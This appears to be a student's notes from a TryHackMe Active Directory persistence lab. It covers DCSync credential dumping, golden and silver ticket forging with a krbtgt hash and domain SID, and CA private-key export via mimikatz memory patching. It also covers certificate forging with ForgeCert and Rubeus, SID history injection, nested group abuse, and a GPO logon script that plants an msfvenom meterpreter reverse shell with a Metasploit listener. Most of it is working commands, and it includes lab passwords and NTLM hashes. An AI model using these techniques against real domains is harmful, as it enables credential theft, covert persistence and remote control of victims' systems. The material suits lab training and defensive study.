AD CREDS
```
Username: Administrator

Password: tryhackmewouldnotguess1@

Domain: ZA
```
```
 Your credentials have been generated: 
 
 Username: grace.clarke 
 Password: Password1 
```
## Persistence Through Credentials
### DC Sync

It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. 

As such, these organisations make use of multiple DCs.

Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information.

This includes information such as the users new password and new objects such as when a new user is created.

This is why you should wait a few minutes after making changes to a user.

**If we have access to an account that has domain replication permissions, we can stage a DC Sync attack to harvest credentials from a DC.**

### Not All Credentials Are Created Equal

While we should always look to dump privileged credentials such as those that are members of the Domain Admins group, these are also the credentials that will be rotated.

As such, if we only have privileged credentials, it is safe to say as soon as the blue team discovers us, they will rotate those accounts, and we can potentially lose our access.

The goal then is to persist with near-privileged credentials. We don't always need the full keys to the kingdom; we just need enough keys to ensure we can still achieve goal execution.

We should attempt to persist through credentials that consist of the following:

- **Credentials That Have Local Administrator Rights on Several Machines** - By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.

- **Service Accounts That Have Delegation Permissions** - With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.

- **Accounts Used For Priviliged AD Services** - Such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.

### DCSync All

Let's start by performing a DC Sync of a single account, our own:
```
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:grace.clarke 
```
This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz:
```
mimikatz # log grace.clarke_dcdump.txt 
mimikatz # lsadump::Dcsync /domain:za.tryhackme.loc /all
```

Then download the file to your machine with scp and look for the NTLM Hashes

## Persistance through Tickets

### Tickets to the Chocolate Factory

![[Pasted image 20230428130245.png]]
The user makes an AS-REQ to the Key Distribution Centre (KDC) on the DC that includes a timestamp encrypted with the user's NTLM hash. 

Essentially, this is the request for a Ticket Granting Ticket (TGT). 

The DC checks the information and sends the TGT to the user. 

This TGT is signed with the KRBTGT account's password hash that is only stored on the DC. 

The user can now send this TGT to the DC to request a Ticket Granting Service (TGS) for the resource that the user wants to access. 

If the TGT checks out, the DC responds to the TGS that is encrypted with the NTLM hash of the service that the user is requesting access for. 

The user then presents this TGS to the service for access, which can verify the TGS since it knows its own hash and can grant the user access.

### Golden Tickets
Golden Tickets are forged TGTs. 

What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. 

Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. 

In order to forge a golden ticket, we need the KRBTGT account's password hash so that we can sign a TGT for any user account we want. 

Some interesting notes about Golden Tickets:

- By injecting at this stage of the Kerberos Process, we don't need the password hash of the account we want to impersonate.  Since it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
- The KDC will only validate the user account specified in the TGT if its older than 20 minutes. This means we can put a disabled, deleted or non existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20minutes.
- By default KRBTGT password never changes, unless its rotated. This gives us persistent access.
- The blue team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
- Rotating the KRBTGT account's password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
- Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
- We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect.

```ad-note
Apart from the KRBTGT account's password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the KRBTGT account's password hash, we would already be in a position where we can recover the other pieces of the required information.
```

### Silver Tickets

Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. 

Some interesting notes about Silver Tickets:
- The generated TGS is signed by the machine account of the host we are targeting.

- The main difference between Golden and Silver Tickets is the number of privileges we acquire. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. 

- Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server.

- Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.

- The machine account's password is usually rotated every 30 days. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account.

- While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

### Forging Tickets for Fun and Profit
 Before starting we need to make not of the krbtgt ntlm hash which we already have from the previous task
 ```
user:krbtgt
ntlm hash:16f9af38fca3ada405386b3b57366082

user: thmserver1
ntlm hash: 4c02d970f7b3da7f8ab6fa4dc77438f4
```
Lets jump on our low privilige user now
```
PS C:\Users\grace.clarke> Get-ADDomain 
...
DomainSID   S-1-5-21-3885271727-2693558621-2658995185
...
```
We got our Domain SID now lets go to mimikatz on our administrator account.
```
mimikatz # kerberos::golden /admin:NotanAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt

```
- /admin - The username we want to impersonate, this does not have to be a valid user
- /domain - The FQDN of the domain we want to generate the ticket for
- /id - The user id. Default mimikatz uses id 500 this is the default admin account RID
- /sid - The ticket lifetime. By default mimikatz generates one that is valid for 10 years. The default kerberos policy is 10 hours (600min)
- /renewmax - The max ticket lifetime with reneweal. The default Kerberos policy of AD is 7 days.
- /ptt - Mimikatz injects the ticket directly into the session making it ready to be used

The silver ticket command is: 
```
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
- /service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
- /rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
- /target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.

## Persistance through certificates

### The Return of AD CS

Certificates can also be used for persistence. All we need is a valid certificate that can be used for Client Authentication. 

This will allow us to use the certificate to request a TGT. 

We can continue requesting TGTs no matter how many rotations they do on the account we are attacking. 

The only way we can be kicked out is if they revoke the certificate we generated or if it expires. 

Meaning we probably have persistent access by default for roughly the next 5 years. 

Depending on our access, we can take it another step further. We could simply steal the private key of the root CA's certificate to generate our own certificates whenever we feel like it. 

Even worse, since these certificates were never issued by the CA, the blue team has no ability to revoke them. 

### Extracting the Private Key

The private key of the CA is stored on the CA server itself. If the private key is not protected through hardware-based protection methods such as an Hardware Security Module (HSM), which is often the case for organisations that just use Active Directory Certificate Services (AD CS) for internal purposes, it is protected by the machine Data Protection API (DPAPI).

We can use tools such as Mimikatz and SharpDPAPI to extract the CA certificate and thus the private key from the CA. Mimikatz is the simplest tool to use.

```
za\administrator@THMDC C:\Users\Administrator>mkdir exzh

za\administrator@THMDC C:\Users\Administrator>cd exzh

za\administrator@THMDC C:\Users\Administrator\exzh>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

mimikatz # crypto::certificates /systemstore:local_machine
```
We can see that there is a CA certificate on the DC. 

We can also note that some of these certificates were set not to allow us to export the key. 
Without this private key, we would not be able to generate new certificates. 

Luckily, Mimikatz allows us to patch memory to make these keys exportable:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched

mimikatz # crypto::certificates /systemstore:local_machine /export
```

The exported certificates will be stored in both PFX and DER format to disk:
```
za\administrator@THMDC C:\Users\Administrator\exzh>dir 
 Volume in drive C is Windows 
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\Administrator\exzh

04/28/2023  01:58 PM    <DIR>          .
04/28/2023  01:58 PM    <DIR>          ..
04/28/2023  01:58 PM             1,423 local_machine_My_0_.der
04/28/2023  01:58 PM             3,299 local_machine_My_0_.pfx
04/28/2023  01:58 PM               939 local_machine_My_1_za-THMDC-CA.der
04/28/2023  01:58 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
04/28/2023  01:58 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
04/28/2023  01:58 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
04/28/2023  01:58 PM             1,465 local_machine_My_3_.der
04/28/2023  01:58 PM             3,321 local_machine_My_3_.pfx
               8 File(s)         18,046 bytes
               2 Dir(s)  51,563,311,104 bytes free

```

The za-THMDC-CA.pfx certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`

### Generating our own certificates
```
 C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

Now lets use Rubeus to request a TGT:
```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:
```

Now we can use Mimikatz to load the TGT and authenticate to THMDC:
```
kerberos::ptt administrator.kirbi
```



## Persistence through SID History 

The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. 

This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one.

In the new domain, the user would have a new SID, but we can add the user's existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. 

While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence.

### History Can Be Whatever We Want It To Be

SID history is not restricted to only including SIDs from other domains. 

With the right permissions, we can just add a SID of our current domain to the SID history of an account we control. 

Some interesting notes about this persistence technique:
 - We normally require Domain Admin privileges or the equivalent thereof to perform this attack.
 
 - When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
 
 - We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
 
 - Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group.

### Forging History
Lets first confirm that our low privilige user does not have information regarding their SID History
```
Get-ADUser <your ad username> -properties sidhistory,memberof

PS C:\Users\grace.clarke> Get-ADUser grace.clarke -properties sidhistory,memberof       


DistinguishedName : CN=grace.clarke,OU=Human Resources,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Grace
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc, CN=HR Share RW,OU=Groups,DC=za,DC=tryhackme,DC=loc} 
Name              : grace.clarke
ObjectClass       : user
ObjectGUID        : bc086e42-6c3d-4166-b9a6-aa993106bf77
SamAccountName    : grace.clarke
SID               : S-1-5-21-3885271727-2693558621-2658995185-1118
SIDHistory        : {}
Surname           : Clarke
UserPrincipalName :
```
This confirms that our user does not currently have any SID History set. 

Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
```
PS C:\Users\grace.clarke> Get-ADGroup "Domain Admins"
```

We could use something like Mimikatz to add SID history. 

However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history.

 In this case, we will use the DSInternals tools to directly patch the ntds.dit file, the AD database where all information is stored:
```
PS C:\Users\Administrator\exzh> Stop-Service -Name ntds -force
PS C:\Users\Administrator\exzh> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
PS C:\Users\Administrator\exzh> Start-Service -Name ntds
```
```ad-note
The NTDS database is locked when the NTDS service is running. 

In order to patch our SID history, we must first stop the service.

You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.
```

To confirm we go back to our low priviliged user and type:
```
PS C:\Users\grace.clarke> Get-ADUser grace.clarke -Properties sidhistory
```

## Persistance through Group Membership

The most privileged account, or group, is not always the best to use for persistence.

Privileged groups are monitored more closely for changes than others

If we want to persist through group membership, we may need to get creative regarding the groups we add our own accounts to for persistence:

- The IT Support group can be used to gain privileges such as force changing user passwords. Although, in most cases, we won't be able to reset the passwords of privileged users, having the ability to reset even low-privileged users can allow us to spread to workstations.

- Groups that provide local administrator rights are often not monitored as closely as protected groups. With local administrator rights to the correct hosts through group membership of a network support group, we may have good persistence that can be used to compromise the domain again.

- It is not always about direct privileges. Sometimes groups with indirect privileges, such as ownership over Group Policy Objects (GPOs), can be just as good for persistence.

### Nested Groups

A recursive group is a group that is a member of another group.

Group nesting is used to create a more organised structure in AD. 

Take the IT Support group, for example. 

There are subgroups like Helpdesk, Access Card Managers, and Network Managers underneath this group. 

The downside to this is that nested groups could have an inifinite amount of other nested groups.

This becomes a monitoring problem, when an alert fires off when a new member is added to the Domain Admins Group its good, but, it wont fire off if a user is added to the subgroup of Domain Admins Group

### Nesting Our Persistence

Command to add user to a nested  domain admin group 

```
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

## Persisting through AD Group Templates
In order to ensure a bit better persistence and make the blue team scratch their heads, we should rather inject into the templates that generate the default groups. 

By injecting into these templates, even if they remove our membership, we just need to wait until the template refreshes, and we will once again be granted membership.

One such template is the AdminSDHolder container. 

This container exists in every AD domain, and its Access Control List (ACL) is used as a template to copy permissions to all protected groups. 

A process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes. 

### Persisting with AdminSDHolder
 ```
 runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
```
----Incomplete due to THM bugs-----

## Persistence through GPOs

### Domain Wide Persistence
The following are some common GPO persistence techniques:

- Restricted Group Membership - This could allow us administrative access to all hosts in the domain
- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. 

While having access to all hosts are nice, it can be even better by ensuring we get access to them when administrators are actively working on them. 

To do this, we will create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.

### Preparation

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > exzh_shell.exe
```

Now lets creat a .bat script that will copy our executable to the host and execute it once a user logs in.

exzh_script.bat
```
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\exzh_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\exzh_shell.exe

```
 Lets upload our files through scp
 ```
scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Lets start our listener 
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

### GPO Creation
The first step uses our Domain Admin account to open the Group Policy Management snap-in:

1. In your runas-spawned terminal, type MMC and press enter.
2. Click on File->Add/Remove Snap-in...
3. Select the Group Policy Management snap-in and click Add
4. Click OK

You should be able to see the GPO manager:
![[Pasted image 20230428163927.png]]
We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO:
![[Pasted image 20230428164003.png]]
Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:
![[Pasted image 20230428164014.png]]
Let's get back to our Group Policy Management Editor:

1. Under User Configuration, expand Policies->Windows Settings.
2. Select Scripts (Logon/Logoff).
3. Right-click on Logon->Properties
4. Select the Scripts tab.
5. Click Add->Browse.
![[Pasted image 20230428164041.png]]

Use your Tier 1 administrator credentials, RDP into one of the servers. If you give it another minute, you should get a callback on your multi-handler:


